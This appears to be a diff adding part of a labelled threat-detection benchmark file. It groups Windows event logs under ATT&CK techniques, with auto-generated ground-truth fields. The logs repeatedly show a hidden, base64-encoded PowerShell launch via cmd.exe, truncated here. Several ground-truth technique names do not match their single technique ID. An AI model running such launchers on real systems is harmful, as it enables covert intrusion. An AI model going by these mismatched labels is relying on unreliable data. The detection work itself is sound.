+          "TargetObject": "nan"
+        },
+        {
+          "idx": 807,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:50.905000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 808,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:50.906000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 809,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.907000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 810,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:50.907000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 811,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:50.908000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 813,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:50.909000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 812,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.909000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 814,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.910000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 815,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.910000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "Obfuscated Files or Information",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: anchor-kw(powershell)"
+    },
+    {
+      "group_id": "T1105_1826",
+      "rule_technique_id": "T1105",
+      "rule_technique_name": "Ingress Tool Transfer",
+      "confidence": 1.0,
+      "anchor": {
+        "idx": 1826,
+        "EventID": 4104,
+        "Image": "nan",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-20 16:17:01.571000+00:00"
+      },
+      "num_events": 337,
+      "event_id_distribution": {
+        "7": 252,
+        "4103": 66,
+        "11": 8,
+        "1": 5,
+        "3": 4,
+        "4104": 1,
+        "22": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 849,
+          "EventID": 11,
+          "TimeCreated": "2020-09-20 16:16:52.933000+00:00",
+          "Image": "C:\\windows\\System32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1046,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.108000+00:00",
+          "Image": "C:\\Windows\\System32\\services.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1048,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.109000+00:00",
+          "Image": "C:\\Windows\\System32\\services.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1049,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.109000+00:00",
+          "Image": "C:\\Windows\\System32\\services.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1056,
+          "EventID": 1,
+          "TimeCreated": "2020-09-20 16:16:57.114000+00:00",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "C:\\windows\\system32\\cmd.exe /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqA",
+          "ParentImage": "C:\\Windows\\System32\\services.exe",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1059,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.116000+00:00",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1063,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.119000+00:00",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1065,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.120000+00:00",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1066,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.120000+00:00",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1064,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.120000+00:00",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1067,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.122000+00:00",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1068,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.122000+00:00",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1069,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.122000+00:00",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1070,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.123000+00:00",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1071,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:57.124000+00:00",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "Ingress Tool Transfer",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: sample-kw+ctx(T1105,c=1.00)"
+    },
+    {
+      "group_id": "T1033_2900",
+      "rule_technique_id": "T1033",
+      "rule_technique_name": "System Owner/User Discovery",
+      "confidence": 1.0,
+      "anchor": {
+        "idx": 2900,
+        "EventID": 1,
+        "Image": "C:\\Windows\\System32\\whoami.exe",
+        "CommandLine": "\"C:\\windows\\system32\\whoami.exe\"",
+        "TimeCreated": "2020-09-20 16:17:19.261000+00:00"
+      },
+      "num_events": 36,
+      "event_id_distribution": {
+        "7": 24,
+        "12": 8,
+        "17": 1,
+        "18": 1,
+        "1": 1,
+        "5": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 2765,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:17:15.156000+00:00",
+          "Image": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections"
+        },
+        {
+          "idx": 2861,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:17:19.229000+00:00",
+          "Image": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections"
+        },
+        {
+          "idx": 2894,
+          "EventID": 17,
+          "TimeCreated": "2020-09-20 16:17:19.257000+00:00",
+          "Image": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2897,
+          "EventID": 18,
+          "TimeCreated": "2020-09-20 16:17:19.259000+00:00",
+          "Image": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2900,
+          "EventID": 1,
+          "TimeCreated": "2020-09-20 16:17:19.261000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "\"C:\\windows\\system32\\whoami.exe\"",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2906,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:17:19.266000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2912,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:17:19.270000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2913,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:17:19.270000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2915,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:17:19.271000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2916,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:17:19.272000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2917,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:17:19.272000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2918,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:17:19.273000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2919,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:17:19.274000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2920,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:17:19.274000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2921,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:17:19.274000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "System Owner/User Discovery",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: sample-kw+ctx(T1033,c=1.00)"
+    },
+    {
+      "group_id": "T1033_2954",
+      "rule_technique_id": "T1033",
+      "rule_technique_name": "System Owner/User Discovery",
+      "confidence": 1.0,
+      "anchor": {
+        "idx": 2954,
+        "EventID": 4688,
+        "Image": "nan",
+        "CommandLine": "\"C:\\windows\\system32\\whoami.exe\"",
+        "TimeCreated": "2020-09-20 16:17:20.290000+00:00"
+      },
+      "num_events": 1,
+      "event_id_distribution": {
+        "4688": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 2954,
+          "EventID": 4688,
+          "TimeCreated": "2020-09-20 16:17:20.290000+00:00",
+          "Image": "nan",
+          "CommandLine": "\"C:\\windows\\system32\\whoami.exe\"",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "System Owner/User Discovery",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": false,
+      "gt_notes": "auto: noise:no-kw,rule!=fam(T1033)"
+    },
+    {
+      "group_id": "T1047_2450",
+      "rule_technique_id": "T1047",
+      "rule_technique_name": "Windows Management Instrumentation",
+      "confidence": 1.0,
+      "anchor": {
+        "idx": 2450,
+        "EventID": 5857,
+        "Image": "nan",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-20 16:17:03.987000+00:00"
+      },
+      "num_events": 10,
+      "event_id_distribution": {
+        "1": 5,
+        "3": 4,
+        "5857": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 1056,
+          "EventID": 1,
+          "TimeCreated": "2020-09-20 16:16:57.114000+00:00",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "C:\\windows\\system32\\cmd.exe /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqA",
+          "ParentImage": "C:\\Windows\\System32\\services.exe",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1072,
+          "EventID": 1,
+          "TimeCreated": "2020-09-20 16:16:57.124000+00:00",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell  -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJAA0ADMARABl",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1086,
+          "EventID": 1,
+          "TimeCreated": "2020-09-20 16:16:57.132000+00:00",
+          "Image": "C:\\Windows\\System32\\conhost.exe",
+          "CommandLine": "\\??\\C:\\windows\\system32\\conhost.exe 0xffffffff -ForceV1",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1363,
+          "EventID": 3,
+          "TimeCreated": "2020-09-20 16:16:58.305000+00:00",
+          "Image": "C:\\Windows\\System32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1365,
+          "EventID": 3,
+          "TimeCreated": "2020-09-20 16:16:58.306000+00:00",
+          "Image": "C:\\Windows\\System32\\services.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 1850,
+          "EventID": 3,
+          "TimeCreated": "2020-09-20 16:17:01.587000+00:00",
+          "Image": "C:\\Windows\\System32\\svchost.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2450,
+          "EventID": 5857,
+          "TimeCreated": "2020-09-20 16:17:03.987000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2468,
+          "EventID": 1,
+          "TimeCreated": "2020-09-20 16:17:03.998000+00:00",
+          "Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+          "CommandLine": "C:\\windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2512,
+          "EventID": 3,
+          "TimeCreated": "2020-09-20 16:17:04.029000+00:00",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 2900,
+          "EventID": 1,
+          "TimeCreated": "2020-09-20 16:17:19.261000+00:00",
+          "Image": "C:\\Windows\\System32\\whoami.exe",
+          "CommandLine": "\"C:\\windows\\system32\\whoami.exe\"",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "Windows Management Instrumentation",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: sample-kw+ctx(T1047,c=1.00)"
+    },
+    {
+      "group_id": "T1047_4215",
+      "rule_technique_id": "T1047",
+      "rule_technique_name": "Windows Management Instrumentation",
+      "confidence": 0.0,
+      "anchor": {
+        "idx": 4215,
+        "EventID": 5857,
+        "Image": "nan",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-20 16:18:20.406000+00:00"
+      },
+      "num_events": 1,
+      "event_id_distribution": {
+        "5857": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 4215,
+          "EventID": 5857,
+          "TimeCreated": "2020-09-20 16:18:20.406000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "Windows Management Instrumentation",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": false,
+      "gt_notes": "auto: noise:c=0,no-kw,rule!=fam(T1047)"
+    },
+    {
+      "group_id": "T1047_4218",
+      "rule_technique_id": "T1047",
+      "rule_technique_name": "Windows Management Instrumentation",
+      "confidence": 0.0,
+      "anchor": {
+        "idx": 4218,
+        "EventID": 5857,
+        "Image": "nan",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-20 16:18:20.409000+00:00"
+      },
+      "num_events": 1,
+      "event_id_distribution": {
+        "5857": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 4218,
+          "EventID": 5857,
+          "TimeCreated": "2020-09-20 16:18:20.409000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "Windows Management Instrumentation",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": false,
+      "gt_notes": "auto: noise:c=0,no-kw,rule!=fam(T1047)"
+    },
+    {
+      "group_id": "T1059_001_1109",
+      "rule_technique_id": "T1059.001",
+      "rule_technique_name": "PowerShell",
+      "confidence": 0.69,
+      "anchor": {
+        "idx": 1109,
+        "EventID": 7,
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-20 16:16:57.148000+00:00"
+      },
+      "num_events": 268,
+      "event_id_distribution": {
+        "10": 126,
+        "4103": 112,
+        "12": 16,
+        "7": 6,
+        "3": 2,
+        "13": 2,
+        "400": 1,
+        "4663": 1,
+        "4656": 1,
+        "22": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 779,
+          "EventID": 12,
+          "TimeCreated": "2020-09-20 16:16:47.881000+00:00",
+          "Image": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "HKU\\S-1-5-21-4228717743-1032521047-1810997296-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections"
+        },
+        {
+          "idx": 780,
+          "EventID": 4103,
+          "TimeCreated": "2020-09-20 16:16:47.882000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 781,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:47.882000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 782,
+          "EventID": 4103,
+          "TimeCreated": "2020-09-20 16:16:47.883000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 783,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:47.883000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 795,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:48.901000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 796,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:48.902000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 797,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:48.902000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 798,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:48.903000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 800,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:49.896000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 801,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:49.896000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 835,
+          "EventID": 4103,
+          "TimeCreated": "2020-09-20 16:16:50.925000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 839,
+          "EventID": 4103,
+          "TimeCreated": "2020-09-20 16:16:50.927000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 841,
+          "EventID": 4103,
+          "TimeCreated": "2020-09-20 16:16:50.930000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 844,
+          "EventID": 4103,
+          "TimeCreated": "2020-09-20 16:16:51.926000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "PowerShell",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: anchor-kw(powershell)"
+    },
+    {
+      "group_id": "T1059_001_1150",
+      "rule_technique_id": "T1059.001",
+      "rule_technique_name": "PowerShell",
+      "confidence": 0.69,
+      "anchor": {
+        "idx": 1150,
+        "EventID": 7,
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "nan",
+        "TimeCreated": "2020-09-20 16:16:57.171000+00:00"
+      },
+      "num_events": 1628,
+      "event_id_distribution": {
+        "10": 792,
+        "12": 342,
+        "7": 271,
+        "13": 74,
+        "4103": 66,
+        "4656": 43,
+        "4663": 23,
+        "1": 5,
+        "5": 2,
+        "3": 2,
+        "11": 2,
+        "23": 2,
+        "17": 2,
+        "22": 1,
+        "18": 1
+      },
+      "sample_logs": [
+        {
+          "idx": 777,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:47.880000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 778,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:47.880000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 799,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:48.904000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 802,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.903000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 803,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.903000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 804,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.904000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 805,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.904000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 806,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.905000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 807,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:50.905000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 808,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:50.906000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 809,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.907000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 810,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:50.907000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 811,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:50.908000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 812,
+          "EventID": 7,
+          "TimeCreated": "2020-09-20 16:16:50.909000+00:00",
+          "Image": "C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        },
+        {
+          "idx": 813,
+          "EventID": 10,
+          "TimeCreated": "2020-09-20 16:16:50.909000+00:00",
+          "Image": "nan",
+          "CommandLine": "nan",
+          "ParentImage": "nan",
+          "TargetObject": "nan"
+        }
+      ],
+      "gt_technique_id": "T1021.002",
+      "gt_technique_name": "PowerShell",
+      "gt_tactic": "Lateral Movement",
+      "gt_is_true_positive": true,
+      "gt_notes": "auto: anchor-kw(powershell)"
+    },
+    {
+      "group_id": "T1070_004_764",
+      "rule_technique_id": "T1070.004",
+      "rule_technique_name": "File Deletion",
+      "confidence": 0.5,
+      "anchor": {
+        "idx": 764,
+        "EventID": 23,
